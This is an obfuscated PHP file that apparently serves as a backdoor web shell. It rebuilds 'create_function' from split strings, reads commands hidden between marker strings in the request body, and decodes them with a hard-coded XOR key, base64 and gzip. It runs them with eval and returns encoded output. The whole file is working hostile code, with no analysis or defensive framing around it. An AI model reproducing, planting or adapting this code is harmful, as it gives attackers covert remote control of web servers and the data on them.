<?php
$h='/input|"),$m)==1) {|@ob_star|t()|;@ev||al(@gzunco|mp|ress(@x(@b|ase64_d|ecode(|$m|[1]),$k)));$o=@o|b_get';
$M='k|||)|{$c=strlen|($k);$l|=|strlen($t);$o="";for(|$i=0;$i<|$l;){for(|$|j=0;($|j<$c|&|&$i<|$l);$j++,$i++)';
$D='{|$o.=$t{$|i}^$|k{$j};}}r|eturn $o;}if |(@pre|g|_m|atch("/$kh(.+)|$kf/"|,@file_get|_con||||tents("php:/';
$i='|$k="20b2460d";$|k|h="91|daf285af71"|||;$kf="930470b88e9||8";|$p="6jf|9vXv|YYbHuNnza";|func|tion x($|t,$';
$c='|_cont|ents();@|ob_e|nd_cl|ean()|;$r=@|b|ase64_encode(|@x(@gz|co|mpr|ess($|o),$k|));print("$p$kh$|r$kf");}';
$W=str_replace('rp','','crprrpearprpte_frpunctirpon');
$l=str_replace('|','',$i.$M.$D.$h.$c);
$d=$W('',$l);$d();
?>
